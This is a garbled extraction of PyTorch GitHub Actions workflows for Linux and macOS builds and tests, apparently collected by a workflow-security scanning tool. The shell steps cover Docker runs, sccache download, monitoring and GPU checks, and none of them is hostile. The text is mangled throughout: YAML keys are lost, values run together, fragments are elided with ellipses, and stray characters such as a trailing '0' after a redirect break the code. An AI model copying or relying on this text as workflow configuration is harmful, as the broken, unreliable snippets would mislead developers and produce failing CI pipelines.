timeout: 120if: ${{ ... lint }}lint-xrefs${{ github.event_name != 'pull_request' || !contains(github.event.pull_request.labels.*.name, 'skip-xref-lint') }}${{ git ... nt') }}./scripts/lint_xrefs.sh $(
  { [ "${{ github.event_name }}" = "pull_request" ] \
      && git diff --name-only "${{ github.event.pull_request.base.sha }}...${{ github.event.pull_request.head.sha }}"; } \
  || \
  { [ "${{ github.event_name }}" = "push" ] \
      && git diff --name-only "${{ github.event.before }}...${{ github.sha }}"; }
) || {
  echo
  echo "Xref lint failed."
  echo "If this is a transient outage, you can bypass it by adding the \`skip-xref-lint\` label to your PR."
  echo "Or add \`@lint-ignore\` somewhere on the same line as the reference you want to skip checking."
  exit 1
}
timeout: 60if: ${{ ... nt') }}lint-urls:/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch___linux-build.ymlbuild-generates-artifactsbuild-g ... tifactsIf set, upload generated build artifacts.If set, ... ifacts.build-with-debugIf set, build in debug mode.If set, ... g mode.cuda-arch-list"5.2"List of CUDA architectures CI build should target.
Prefix for runner labelPrefix  ... r labellinux.2xlarge"linux.2xlarge"Label of the runner this job should run on.
An option JSON description of what test configs to run later on. This
is moved here from the Linux test workflow so that we can apply filter
logic using test-config labels earlier and skip unnecessary builds
selected-test-configsselecte ... configsA comma-separated list of test configurations from the test matrix to keep,
The empty list means we are going to keep every configurations by defaults
Role to assume for downloading artifactsRole to ... tifactsmax-jobsOverwrite the number of jobs to use for the build
disable-monitorDisable utilization monitoring for build job
monitor-log-intervalSet the interval for the monitor script to log utilization.
monitor-data-collect-intervalmonitor ... ntervalSet the interval for the monitor script to collect data.
allow-reuse-old-whlIf set, the build try to pull an old wheel from s3 that was built on a
commit with no cpp changes from this commit
HUGGING_FACE_HUB_TOKENHUGGING ... B_TOKENHF Auth token to avoid rate limits when downloading models or datasets from hub
SCRIBE_GRAPHQL_ACCESS_TOKENSCRIBE_ ... S_TOKENFB app token to write to scribe endpoint
HUGGING ... _TOKEN:${{ jobs.build.outputs.docker-image }}${{ job ... mage }}The docker image containing the built PyTorch.The doc ... yTorch.value:  ... mage }}${{ jobs.build.outputs.test-matrix }}${{ job ... trix }}An optional JSON description of what test configs to run later on.An opti ... ter on.value:  ... trix }}docker-image:${{ github.ref == 'refs/heads/main' && 'scribe-protected' || startsWith(github.ref, 'refs/heads/release/') && 'scribe-protected' || contains(github.event.pull_request.labels.*.name, 'ci-scribe') && 'scribe-pr' || '' }}${{ inputs.runner_prefix}}${{ inputs.runner }}${{ inp ... nner }}inputs.build-environment != 'linux-s390x-binary-manywheel'${{ inputs.aws-role-to-assume != '' && inputs.build-environment != 'linux-s390x-binary-manywheel' }}gha-linux-buildCheck if can use old whl buildCheck i ... l builduse-old-whl./.github/actions/reuse-old-whl./.gith ... old-whl${{ inputs.allow-reuse-old-whl && github.event_name == 'push' }}${{ inp ... ush' }}run-idbuild-e ... ment }}name: C ... l buildUse following to pull public copy of the imageUse fol ... e imageprint-ghcr-mirrorinputs.build-environment != 'linux-s390x-binary-manywheel' && steps.use-old-whl.outputs.reuse != 'true'ECR_DOCKER_IMAGEECR_DOC ... mage }}tag=${ECR_DOCKER_IMAGE##*/}
echo "docker pull ghcr.io/pytorch/ci-image:${tag/:/-}"
name: U ... e imageSelect all requested test configurations (if the test matrix is available)Select  ... ilable)${{ inputs.selected-test-configs }}${{ inp ... figs }}job-name${{ steps.get-job-id.outputs.job-name }}name: S ... ilable)Start monitoring scriptStart m ...  scriptmonitor-script${{ !inputs.disable-monitor }}${{ !in ... itor }}JOB_NAMEWORKFLOW_NAMEWORKFLOW_RUN_ID${{github.run_id}}MONITOR_LOG_INTERVAL${{ inputs.monitor-log-interval }}${{ inp ... rval }}MONITOR_DATA_COLLECT_INTERVALMONITOR ... NTERVAL${{ inputs.monitor-data-collect-interval }}JOB_ID: ... b-id }}mkdir -p ../../usage_logs
python3 -m pip install psutil==5.9.1 dataclasses_json==0.6.7
python3 -m tools.stats.monitor \
--log-interval "$MONITOR_LOG_INTERVAL" \
--data-collect-interval "$MONITOR_DATA_COLLECT_INTERVAL" \
> "../../usage_logs/usage_log_build_${JOB_ID}.txt" 2>&1 &
echo "monitor-script-pid=${!}" >> "${GITHUB_OUTPUT}"
name: S ...  scriptDownload pytest cacheDownloa ... t cache./.github/actions/pytest-cache-download./.gith ... ownloadcache_dir.pytest_cachejob_identifier${{ github.workflow }}_${{ inputs.build-environment }}${{ git ... ment }}s3_bucketcache_d ... t_cachename: D ... t cache(steps.filter.outputs.is-test-matrix-empty == 'False' || inputs.test-matrix == '') && steps.use-old-whl.outputs.reuse != 'true'(steps. ...  'true'XLA_CLANG_CACHE_S3_BUCKET_NAMEXLA_CLA ... ET_NAMEossci-compiler-clang-cache-circleci-xlaossci-c ... eci-xlaPR_LABELS${{ toJson(github.event.pull_request.labels.*.name) }}${{ toJ ... ame) }}${{ inputs.cuda-arch-list }}${{ inp ... list }}DOCKER_IMAGE_S390XXLA_CUDA${{ contains(inputs.build-environment, 'xla') && '0' || '' }}${{ con ... | '' }}${{ inputs.build-with-debug && '1' || '0' }}${{ inp ...  '0' }}${{ secrets.HUGGING_FACE_HUB_TOKEN }}${{ secrets.SCRIBE_GRAPHQL_ACCESS_TOKEN }}MAX_JOBS_OVERRIDE${{ inputs.max-jobs }}${{ inp ... jobs }}START_TIME=$(date +%s)
if [[ ${BUILD_ENVIRONMENT} == *"s390x"* ]]; then
  JENKINS_USER=
  USED_IMAGE="${DOCKER_IMAGE_S390X}"
  # ensure that docker container cleanly exits in 12 hours
  # if for some reason cleanup action doesn't stop container
  # when job is cancelled
  DOCKER_SHELL_CMD="sleep 12h"

  # since some steps are skipped on s390x, if they are necessary, run them here
  env | grep '^GITHUB' >> "/tmp/github_env_${GITHUB_RUN_ID}"
  env | grep '^CI' >> "/tmp/github_env_${GITHUB_RUN_ID}"
else
  JENKINS_USER="--user jenkins"
  USED_IMAGE="${DOCKER_IMAGE}"
  DOCKER_SHELL_CMD=
fi

if [[ ${MAX_JOBS_OVERRIDE} == "" ]]; then
  MAX_JOBS="$(nproc --ignore=2)"
else
  MAX_JOBS="${MAX_JOBS_OVERRIDE}"
fi

# Leaving 1GB for the runner and other things
TOTAL_AVAILABLE_MEMORY_IN_GB=$(awk '/MemTotal/ { printf "%.3f \n", $2/1024/1024 - 1 }' /proc/meminfo)
# https://docs.docker.com/engine/containers/resource_constraints/#--memory-swap-details, the 3GB swap
# comes from https://github.com/pytorch/test-infra/pull/6058
TOTAL_MEMORY_WITH_SWAP=$(("${TOTAL_AVAILABLE_MEMORY_IN_GB%.*}" + 3))

# detached container should get cleaned up by teardown_ec2_linux
# Used for JENKINS_USER and DOCKER_SHELL_CMD, which can be empty
# shellcheck disable=SC2086
container_name=$(docker run \
  -e BUILD_ENVIRONMENT \
  -e MAX_JOBS=${MAX_JOBS} \
  -e MAX_JOBS_OVERRIDE \
  -e AWS_DEFAULT_REGION \
  -e PR_NUMBER \
  -e SHA1 \
  -e BRANCH \
  -e SCCACHE_BUCKET \
  -e SCCACHE_REGION \
  -e XLA_CUDA \
  -e XLA_CLANG_CACHE_S3_BUCKET_NAME \
  -e SKIP_SCCACHE_INITIALIZATION=1 \
  -e TORCH_CUDA_ARCH_LIST \
  -e PR_LABELS \
  -e OUR_GITHUB_JOB_ID \
  -e HUGGING_FACE_HUB_TOKEN \
  -e SCRIBE_GRAPHQL_ACCESS_TOKEN \
  -e USE_SPLIT_BUILD \
  --memory="${TOTAL_AVAILABLE_MEMORY_IN_GB%.*}g" \
  --memory-swap="${TOTAL_MEMORY_WITH_SWAP}g" \
  --env-file="/tmp/github_env_${GITHUB_RUN_ID}" \
  --security-opt seccomp=unconfined \
  --cap-add=SYS_PTRACE \
  --tty \
  --detach \
  ${JENKINS_USER} \
  -v "${GITHUB_WORKSPACE}:/var/lib/jenkins/workspace" \
  -w /var/lib/jenkins/workspace \
  "${USED_IMAGE}" \
  ${DOCKER_SHELL_CMD}
)
docker exec -t "${container_name}" sh -c '.ci/pytorch/build.sh'

END_TIME=$(date +%s)
echo "build_time=$((END_TIME - START_TIME))" >> "$GITHUB_OUTPUT"
Stop monitoring scriptStop mo ...  script${{ always() && steps.monitor-script.outputs.monitor-script-pid }}${{ alw ... -pid }}MONITOR_SCRIPT_PID${{ steps.monitor-script.outputs.monitor-script-pid }}${{ ste ... -pid }}MONITOR ... -pid }}kill "$MONITOR_SCRIPT_PID"
Archive artifacts into zipArchive ... nto zipinputs.build-generates-artifacts && steps.build.outcome != 'skipped' && steps.use-old-whl.outputs.reuse != 'true'zip -1 -r artifacts.zip dist/ build/custom_test_artifacts build/lib build/bin .additional_ci_files
name: A ... nto zipStore PyTorch Build Artifacts on S3Store P ... s on S3inputs.build-generates-artifacts && (steps.build.outcome != 'skipped' || steps.use-old-whl.outputs.reuse == 'true') && inputs.build-environment != 'linux-s390x-binary-manywheel'artifacts.zipname: S ... s on S3Store PyTorch Build Artifacts for s390xStore P ... r s390xinputs.build-generates-artifacts && (steps.build.outcome != 'skipped' || steps.use-old-whl.outputs.reuse == 'true') && inputs.build-environment == 'linux-s390x-binary-manywheel'name: S ... r s390xcopy logs${{ always() && steps.build.outcome != 'skipped' && !inputs.disable-monitor && inputs.build-environment != 'linux-s390x-binary-manywheel'}}${{ alw ... heel'}}rm -f ./usage_logs
mkdir -p ./usage_logs
cp ../../usage_logs/usage_log_build_*.txt ./usage_logs/
name: copy logsUpload raw usage log to s3Upload  ... g to s3seemethere/upload-artifact-s3@v5seemeth ... t-s3@v5${{ github.repository }}/${{ github.run_id }}/${{ github.run_attempt }}/artifact
usage_logs/usage_log_build_*.txtusage_l ... d_*.txts3-prefix: |name: U ... g to s3Upload sccache statssteps.build.outcome != 'skipped' && inputs.build-environment != 'linux-s390x-binary-manywheel'steps.b ... ywheel'./.github/actions/upload-sccache-stats./.gith ... e-statsbuild-time${{ steps.build.outputs.build_time }}${{ ste ... time }}name: U ... e statsUpload utilization statsUpload  ... n stats${{ always() && steps.build.outcome != 'skipped' && !inputs.disable-monitor && inputs.build-environment != 'linux-s390x-binary-manywheel' }}${{ alw ... eel' }}./.github/actions/upload-utilization-stats./.gith ... n-statsjob_idjob_nameworkflow_nameworkflow_run_idworkflow_attempt${{github.run_attempt}}${{gith ... tempt}}artifact_prefixusage_log_build_${{ steps.get-job-id.outputs.job-id }}usage_l ... b-id }}job_id: ... b-id }}name: U ... n statsalways() && inputs.build-environment != 'linux-s390x-binary-manywheel'always() && inputs.build-environment == 'linux-s390x-binary-manywheel'# on s390x stop the container for clean worker stop
docker stop -a || true
docker kill -a || true
environ ... | '' }}name: linux-build/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch___linux-test.ymllinux-testJSON description of what test configs to run.JSON de ... to run.Set the maximum (in minutes) how long the workflow should take to finish
use-ghaIf set to any value, upload to GHA. Otherwise upload to S3.If set  ...  to S3.dashboard-tag[Experimental] Disable utilization monitoring for tests.
Currently, by default we disable the monitor job and only look for specific tests,
since we are investigating the behaviour of the monitor script with different tests.
github.repository_owner == 'pytorch' && toJSON(fromJSON(inputs.test-matrix).include) != '[]'github. ... != '[]'${{ fromJSON(inputs.test-matrix) }}${{ matrix.mem_leak_check == 'mem_leak_check' && 600 || inputs.timeout-minutes }}${{ !contains(matrix.runner, 'gcp.a100') && inputs.build-environment != 'linux-s390x-binary-manywheel' }}${{ !co ... eel' }}All testing is done inside the container, to start an interactive session run:
  docker exec -it $(docker container ps --format '{{.ID}}') bash
install-nvidia-driverinstall ... -driver${{ contains(inputs.build-environment, 'cuda') && !contains(matrix.config, 'nogpu') && steps.check_container_runner.outputs.IN_CONTAINER_RUNNER == 'false' }}${{ con ... lse' }}Setup GPU_FLAG for docker runSetup G ... ker runsetup-gpu-flagecho "GPU_FLAG=--gpus all -e NVIDIA_DRIVER_CAPABILITIES=all" >> "${GITHUB_ENV}"echo "G ... B_ENV}"${{ contains(inputs.build-environment, 'cuda') && !contains(matrix.config, 'nogpu') && steps.check_container_runner.outputs.IN_CONTAINER_RUNNER == 'true' }}${{ con ... rue' }}name: S ... ker runSetup SCCACHE_SERVER_PORT environment for docker run when on containerSetup S ... ntainersetup-sscache-port-flagsetup-s ... rt-flagecho "SCCACHE_SERVER_PORT_DOCKER_FLAG=-e SCCACHE_SERVER_PORT=$((RUNNER_UID + 4226))" >> "${GITHUB_ENV}"echo "S ... B_ENV}"${{ steps.check_container_runner.outputs.IN_CONTAINER_RUNNER == 'true' }}name: S ... ntainerLock NVIDIA A100 40GB FrequencyLock NV ... equencysudo nvidia-smi -pm 1
sudo nvidia-smi -ac 1215,1410
nvidia-smi
${{ contains(matrix.runner, 'a100') && steps.check_container_runner.outputs.IN_CONTAINER_RUNNER == 'false' }}name: L ... equencypython3 -m pip install psutil==5.9.1 dataclasses_json==0.6.7 nvidia-ml-py==11.525.84
python3 -m tools.stats.monitor --log-interval "$MONITOR_LOG_INTERVAL" --data-collect-interval "$MONITOR_DATA_COLLECT_INTERVAL" > usage_log.txt 2>&1 &
echo "monitor-script-pid=${!}" >> "${GITHUB_OUTPUT}"
${{ inputs.use-gha }}${{ inp ... -gha }}Download TD artifacts./.github/actions/download-td-artifactsCheck for keep-going label and re-enabled test issuesCheck f ...  issuesSet Test step timetest-timeoutJOB_TIMEOUTJOB_TIM ... utes }}echo "timeout=$((JOB_TIMEOUT-30))" >> "${GITHUB_OUTPUT}"
name: S ... ep time${{ fromJson(steps.test-timeout.outputs.timeout) }}${{ fro ... out) }}${{ github.event.pull_request.base.sha || github.sha }}TEST_CONFIG${{ matrix.config }}SHARD_NUMBER${{ matrix.shard }}NUM_TEST_SHARDS${{ matrix.num_shards }}${{ mat ... ards }}${{ steps.keep-going.outputs.reenabled-issues }}CONTINUE_THROUGH_ERRORCONTINU ... H_ERROR${{ steps.keep-going.outputs.keep-going }}VERBOSE_TEST_LOGS${{ steps.keep-going.outputs.ci-verbose-test-logs }}${{ ste ... logs }}TEST_SHOWLOCALS${{ steps.keep-going.outputs.ci-test-showlocals }}${{ ste ... cals }}NO_TEST_TIMEOUT${{ steps.keep-going.outputs.ci-no-test-timeout }}${{ ste ... eout }}NO_TD${{ steps.keep-going.outputs.ci-no-td }}${{ ste ... o-td }}TD_DISTRIBUTED${{ steps.keep-going.outputs.ci-td-distributed }}${{ ste ... uted }}SHM_SIZE${{ contains(inputs.build-environment, 'cuda') && '2g' || '1g' }}${{ con ... '1g' }}PYTORCH_TEST_CUDA_MEM_LEAK_CHECKPYTORCH ... K_CHECK${{ matrix.mem_leak_check && '1' || '0' }}${{ mat ...  '0' }}PYTORCH_TEST_RERUN_DISABLED_TESTSPYTORCH ... D_TESTS${{ matrix.rerun_disabled_tests && '1' || '0' }}DASHBOARD_TAG${{ inputs.dashboard-tag }}${{ inp ... -tag }}IS_A100_RUNNER${{ contains(matrix.runner, 'a100') && '1' || '0' }}${{ con ...  '0' }}ARTIFACTS_FILE_SUFFIXARTIFAC ... _SUFFIX${{ github.job }}-${{ matrix.config }}-${{ matrix.shard }}-${{ matrix.num_shards }}-${{ matrix.runner }}_${{ steps.get-job-id.outputs.job-id }}${{ git ... b-id }}set -x

if [[ $TEST_CONFIG == 'multigpu' ]]; then
  TEST_COMMAND=.ci/pytorch/multigpu-test.sh
elif [[ $BUILD_ENVIRONMENT == *onnx* ]]; then
  TEST_COMMAND=.ci/onnx/test.sh
else
  TEST_COMMAND=.ci/pytorch/test.sh
fi

# Leaving 1GB for the runner and other things
TOTAL_AVAILABLE_MEMORY_IN_GB=$(awk '/MemTotal/ { printf "%.3f \n", $2/1024/1024 - 1 }' /proc/meminfo)
# https://docs.docker.com/engine/containers/resource_constraints/#--memory-swap-details, the 3GB swap
# comes from https://github.com/pytorch/test-infra/pull/6058
TOTAL_MEMORY_WITH_SWAP=$(("${TOTAL_AVAILABLE_MEMORY_IN_GB%.*}" + 3))

if [[ ${BUILD_ENVIRONMENT} == *"s390x"* ]]; then
  SHM_OPTS=
  JENKINS_USER=
  # ensure that docker container cleanly exits in 12 hours
  # if for some reason cleanup action doesn't stop container
  # when job is cancelled
  DOCKER_SHELL_CMD="sleep 12h"

  # since some steps are skipped on s390x, if they are necessary, run them here
  env | grep '^GITHUB' >> "/tmp/github_env_${GITHUB_RUN_ID}"
  env | grep '^CI' >> "/tmp/github_env_${GITHUB_RUN_ID}"
else
  SHM_OPTS="--shm-size=${SHM_SIZE}"
  JENKINS_USER="--user jenkins"
  DOCKER_SHELL_CMD=
fi

# detached container should get cleaned up by teardown_ec2_linux
# TODO: Stop building test binaries as part of the build phase
# Used for GPU_FLAG, SHM_OPTS, JENKINS_USER and DOCKER_SHELL_CMD since that doesn't play nice
# shellcheck disable=SC2086,SC2090
container_name=$(docker run \
  ${GPU_FLAG:-} \
  ${SCCACHE_SERVER_PORT_DOCKER_FLAG:-} \
  -e BUILD_ENVIRONMENT \
  -e PR_NUMBER \
  -e GITHUB_ACTIONS \
  -e GITHUB_REPOSITORY \
  -e GITHUB_WORKFLOW \
  -e GITHUB_JOB \
  -e GITHUB_RUN_ID \
  -e GITHUB_RUN_NUMBER \
  -e GITHUB_RUN_ATTEMPT \
  -e JOB_ID \
  -e JOB_NAME \
  -e BASE_SHA \
  -e BRANCH \
  -e SHA1 \
  -e AWS_DEFAULT_REGION \
  -e IN_WHEEL_TEST \
  -e SHARD_NUMBER \
  -e TEST_CONFIG \
  -e NUM_TEST_SHARDS \
  -e REENABLED_ISSUES \
  -e CONTINUE_THROUGH_ERROR \
  -e VERBOSE_TEST_LOGS \
  -e TEST_SHOWLOCALS \
  -e NO_TEST_TIMEOUT \
  -e NO_TD \
  -e TD_DISTRIBUTED \
  -e PR_LABELS \
  -e MAX_JOBS="$(nproc --ignore=2)" \
  -e SCCACHE_BUCKET \
  -e SCCACHE_REGION \
  -e XLA_CUDA \
  -e XLA_CLANG_CACHE_S3_BUCKET_NAME \
  -e PYTORCH_TEST_CUDA_MEM_LEAK_CHECK \
  -e PYTORCH_TEST_RERUN_DISABLED_TESTS \
  -e SKIP_SCCACHE_INITIALIZATION=1 \
  -e HUGGING_FACE_HUB_TOKEN \
  -e SCRIBE_GRAPHQL_ACCESS_TOKEN \
  -e DASHBOARD_TAG \
  -e IS_A100_RUNNER \
  -e ARTIFACTS_FILE_SUFFIX \
  --memory="${TOTAL_AVAILABLE_MEMORY_IN_GB%.*}g" \
  --memory-swap="${TOTAL_MEMORY_WITH_SWAP}g" \
  --env-file="/tmp/github_env_${GITHUB_RUN_ID}" \
  --security-opt seccomp=unconfined \
  --cap-add=SYS_PTRACE \
  --ipc=host \
  ${SHM_OPTS} \
  --tty \
  --detach \
  --name="${container_name}" \
  ${JENKINS_USER} \
  -v "${GITHUB_WORKSPACE}:/var/lib/jenkins/workspace" \
  -w /var/lib/jenkins/workspace \
  "${DOCKER_IMAGE}" \
  ${DOCKER_SHELL_CMD}
)
# Propagate download.pytorch.org IP to container
grep download.pytorch.org /etc/hosts | docker exec -i "${container_name}" sudo bash -c "/bin/cat >> /etc/hosts"
echo "DOCKER_CONTAINER_ID=${container_name}" >> "${GITHUB_ENV}"

if [[ ${BUILD_ENVIRONMENT} == *"s390x"* ]]; then
  docker exec -t "${container_name}" sh -c "python3 -m pip install -r .ci/docker/requirements-ci.txt"
fi

docker exec -t "${container_name}" sh -c "python3 -m pip install $(echo dist/*.whl)[opt-einsum] && ${TEST_COMMAND}"
Upload pytest cache if tests failedUpload  ...  failed./.github/actions/pytest-cache-upload./.gith ... -uploadfailure() && steps.test.conclusion && steps.test.conclusion == 'failure'failure ... ailure'test_configname: U ...  failedUpload the benchmark resultsUpload  ... resultspytorch/test-infra/.github/actions/upload-benchmark-results@mainpytorch ... ts@mainbenchmark-results-dirbenchma ... lts-dirtest/test-reportsdry-runschema-versionv3benchma ... reportsname: U ... resultsCollect backtraces from coredumps (if any)Collect ... if any)# shellcheck disable=SC2156
find . -iname "core.[1-9]*" -exec docker exec "${DOCKER_CONTAINER_ID}" sh -c "gdb python {} -ex 'bt' -ex 'q'" \;
name: C ... if any)Store Core dumps on S3Store C ... s on S3coredumps-${{ matrix.config }}-${{ matrix.shard }}-${{ matrix.num_shards }}-${{ matrix.runner }}coredum ... nner }}./**/core.[1-9]*name: c ... nner }}${{ always() && steps.test.conclusion && steps.test.conclusion != 'skipped' && !inputs.disable-monitor }}${{ alw ... itor }}always() && steps.check_container_runner.outputs.IN_CONTAINER_RUNNER == 'false'Check NVIDIA driver installation stepCheck N ... on stepfailure() && steps.install-nvidia-driver.outcome && steps.install-nvidia-driver.outcome != 'skipped'failure ... kipped'set +e
set -x

nvidia-smi
# NB: Surprisingly, nvidia-smi command returns successfully with return code 0 even in
# the case where the driver has already crashed as it still can get the driver version
# and some basic information like the bus ID.  However, the rest of the information
# would be missing (ERR!), for example:
#
# +-----------------------------------------------------------------------------+
# | NVIDIA-SMI 525.89.02    Driver Version: 525.89.02    CUDA Version: 12.0     |
# |-------------------------------+----------------------+----------------------+
# | GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |
# | Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |
# |                               |                      |               MIG M. |
# |===============================+======================+======================|
# |   0  ERR!                Off  | 00000000:00:1E.0 Off |                 ERR! |
# |ERR!  ERR! ERR!    ERR! / ERR! |   4184MiB / 23028MiB |    ERR!      Default |
# |                               |                      |                 ERR! |
# +-------------------------------+----------------------+----------------------+
#
# +-----------------------------------------------------------------------------+
# | Processes:                                                                  |
# |  GPU   GI   CI        PID   Type   Process name                  GPU Memory |
# |        ID   ID                                                   Usage      |
# |=============================================================================|
# +-----------------------------------------------------------------------------+
#
# This should be reported as a failure instead as it will guarantee to fail when
# Docker tries to run with --gpus all
#
# So, the correct check here is to query one of the missing piece of info like
# GPU name, so that the command can fail accordingly
nvidia-smi --query-gpu=gpu_name --format=csv,noheader --id=0
NVIDIA_SMI_STATUS=$?

# These are acceptable return code from nvidia-smi as copied from setup-nvidia GitHub action
if [ "$NVIDIA_SMI_STATUS" -ne 0 ] && [ "$NVIDIA_SMI_STATUS" -ne 14 ]; then
  echo "NVIDIA driver installation has failed, shutting down the runner..."
  .github/scripts/stop_runner_service.sh
fi

# For runner with multiple GPUs, we also want to confirm that the number of GPUs are the
# power of 2, i.e. 1, 2, 4, or 8. This is to avoid flaky test issue when one GPU fails
# https://github.com/pytorch/test-infra/issues/4000
GPU_COUNT=$(nvidia-smi --list-gpus | wc -l)
NVIDIA_SMI_STATUS=$?

# These are acceptable return code from nvidia-smi as copied from setup-nvidia GitHub action
if [ "$NVIDIA_SMI_STATUS" -ne 0 ] && [ "$NVIDIA_SMI_STATUS" -ne 14 ]; then
  echo "NVIDIA driver installation has failed, shutting down the runner..."
  .github/scripts/stop_runner_service.sh
fi

# Check the GPU count to be a power of 2
if [ "$GPU_COUNT" -le 8 ] && [ "$GPU_COUNT" -ne 1 ] && [ "$GPU_COUNT" -ne 2 ] && [ "$GPU_COUNT" -ne 4 ] && [ "$GPU_COUNT" -ne 8 ]; then
  echo "NVIDIA driver detects $GPU_COUNT GPUs. The runner has a broken GPU, shutting it down..."
  .github/scripts/stop_runner_service.sh
fi
name: C ... on stepif: git ... != '[]'name: linux-test/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch___mac-build.ymlrunner-typeName of the GitHub-managed runner type to use for the build.Name of ...  build.xcode-versionWhat xcode version to build with.What xc ... d with."3.9"The python version to be used. Will be 3.9 by default
sccache-use-ghaIf true, use the Github cache as the storage option for sccache instead of S3.If true ...  of S3.build-outcome${{ jobs.build.outputs.build-outcome }}${{ job ... come }}The outcome of the build step. This is used to influence test filtering logic later on.The out ... ter on.value:  ... come }}test-matrix:${{ inputs.runner-type }}SCCACHE_USE_GHA${{ inputs.sccache-use-gha }}${{ steps.build.outcome }}${{ ste ... come }}build-o ... come }}Clean up disk space before running MacOS workflowClean u ... orkflowpytorch/test-infra/.github/actions/check-disk-space@mainpytorch ... ce@mainname: C ... orkflowSet xcode versionXCODE_VERSION${{ inputs.xcode-version }}XCODE_V ... sion }}if [ -n "${XCODE_VERSION}" ]; then
  echo "DEVELOPER_DIR=/Applications/Xcode_${XCODE_VERSION}.app/Contents/Developer" >> "${GITHUB_ENV}"
fi
Setup minicondapytorch/test-infra/.github/actions/setup-miniconda@mainpytorch ... da@main${{ inputs.python-version }}environment-file.github/requirements/conda-env-${{ runner.os }}-${{ runner.arch }}.github ... arch }}pip-requirements-filepip-req ... ts-file.github/requirements/pip-requirements-${{ runner.os }}.txt.github ...  }}.txtname: S ... nicondaInstall sccache (only for non-forked PRs, and pushes to trunk)Install ...  trunk)nick-fields/retry@7152eba30c6575329ac0576536151aca5a72780enick-fi ... a72780e${{ github.event_name == 'push' || github.event.pull_request.head.repo.full_name == github.repository }}timeout_minutesmax_attemptsretry_wait_secondscommandset -ex

DOWNLOAD_SCCACHE=0
SCCACHE_VERSION="0.4.1"
LOCAL_PATH="/usr/local/bin"

if [ ! -f "${LOCAL_PATH}/sccache" ]; then
  DOWNLOAD_SCCACHE=1
else
  LOCAL_VERSION=$("${LOCAL_PATH}/sccache" --version | cut -d" " -f2)

  if [ "${LOCAL_VERSION}" != "${SCCACHE_VERSION}" ]; then
    DOWNLOAD_SCCACHE=1
  fi
fi

if [ "${DOWNLOAD_SCCACHE}" == "1" ]; then
  sudo curl --retry 3 --retry-all-errors "https://s3.amazonaws.com/ossci-macos/sccache/sccache-v0.4.1-${RUNNER_ARCH}" --output "${LOCAL_PATH}/sccache"
  sudo chmod +x "${LOCAL_PATH}/sccache"
fi

if [[ "${SCCACHE_USE_GHA}" == "true" ]]; then
  echo "ACTIONS_CACHE_URL=${ACTIONS_CACHE_URL}" >> "${GITHUB_ENV}"
  echo "ACTIONS_RUNTIME_TOKEN=${ACTIONS_RUNTIME_TOKEN}" >> "${GITHUB_ENV}"
  echo "SCCACHE_GHA_ENABLED=on" >> "${GITHUB_ENV}"
else
  # The runner has access to the S3 bucket via IAM profile without the need
  # for any credential
  echo "SCCACHE_BUCKET=ossci-compiler-cache-circleci-v2" >> "${GITHUB_ENV}"0
  echo "SCCACHE_S3_KEY_PREFIX=${GITHUB_WORKFLOW}" >> "${GITHUB_ENV}"
fi

# This is needed so that later build script could find sccache (which sccache)
echo "${LOCAL_PATH}" >> $GITHUB_PATH
timeout_minutes: 5name: I ...  trunk)steps.filter.outputs.is-test-matrix-empty == 'False' || inputs.test-matrix == ''steps.f ... x == ''OUR_GIT ... b-id }}echo "CMAKE_PREFIX_PATH=${CONDA_PREFIX:-"$(dirname "$(which conda)")/../"}" >> "${GITHUB_ENV}"

if [[ -n "$CONDA_ENV" ]]; then
  # Use binaries under conda environment
  export PATH="$CONDA_ENV/bin":$PATH
fi

# NB: Same trick as Linux, there is no need to initialize sccache with the risk of getting
# it hangs or timeout at initialization. The cache will be started automatically
export SKIP_SCCACHE_INITIALIZATION=1
${CONDA_RUN} .ci/pytorch/macos-build.sh
inputs.build-generates-artifacts && steps.build.outcome != 'skipped'inputs. ... kipped'zip -1 -r artifacts.zip dist/ build/.ninja_log build/compile_commands.json .additional_ci_files
Store PyTorch Build Artifacts on GHAStore P ...  on GHA${{ env.BUILD_ENVIRONMENT }}${{ env ... MENT }}name: $ ... MENT }}name: S ...  on GHAUpload sccache stats to GHAUpload  ...  to GHA${{ (github.event_name == 'push' || github.event.pull_request.head.repo.full_name == github.repository) && steps.build.outcome != 'skipped' }}${{ (gi ... ped' }}sccache-stats-${{ inputs.build-environment }}-runattempt${{ github.run_attempt }}-${{ steps.get-job-id.outputs.job-id }}sccache ... b-id }}sccache-stats-*.jsonname: s ... b-id }}name: U ...  to GHAClean up disk spacename: C ... k spacename: mac-build/home/huawei/github-actions-security/.github/workflows/pytorch_pytorch___mac-test.ymlmac-test270shell:  ...  -l {0}PR_BODYPrint runner OS/HW infoPrint r ... HW infosysctl machdep.cpu.brand_string kern.osproductversion
name: P ... HW infoClean up leftover processes on MacOS pet runnerClean u ...  runnerfor PROCESS in "python" "conda" "ninja" "clang"; do
  echo "Cleaning up all remaining ${PROCESS} process"
  pkill "${PROCESS}" || true
done
Clean up leftover local python3 site-packages on MacOS pet runnerfor dir in  ~/.local/lib/python3.*/site-packages; do
  echo "Cleaning up ${dir}"
  rm -rf "${dir}"
done
${CONDA_RUN} python3 -m pip install psutil==5.9.1 dataclasses_json==0.6.7
${CONDA_RUN} python3 -m tools.stats.monitor --log-interval "$MONITOR_LOG_INTERVAL" --data-collect-interval "$MONITOR_DATA_COLLECT_INTERVAL" > usage_log.txt 2>&1 &
echo "monitor-script-pid=${!}" >> "${GITHUB_OUTPUT}"
use-gha: truePIP_REQUIREMENTS_FILEPIP_REQ ... TS_FILEPYTORCH ...  '0' }}# shellcheck disable=SC1090
set -ex

arch

if [[ -n "$CONDA_ENV" ]]; then
  # Use binaries under conda environment
  export PATH="$CONDA_ENV/bin":$PATH
fi

# Print out some information about the test environment
which conda
conda --version
${CONDA_RUN} which python3
${CONDA_RUN} python3 --version
${CONDA_RUN} which python
${CONDA_RUN} python --version

${CONDA_RUN} python3 -mpip install --no-index --no-deps dist/*.whl

set +e
pushd "${RUNNER_TEMP}"
# Install pip dependencies if they are not found. This is to mitigate a peculiar
# flaky missing dependencies on MacOS
${CONDA_RUN} python3 -c "import torch"
RC=$?
popd

if [ "${RC}" -ne 0 ]; then
  ${CONDA_RUN} python3 -mpip install --ignore-installed -r "${PIP_REQUIREMENTS_FILE}"
fi
set -e

${CONDA_RUN} .ci/pytorch/macos-test.sh
Run OP benchmark${{ contains(steps.get-job-id.outputs.job-name, 'mps') }}${{ con ... ps') }}if [[ -n "$CONDA_ENV" ]]; then
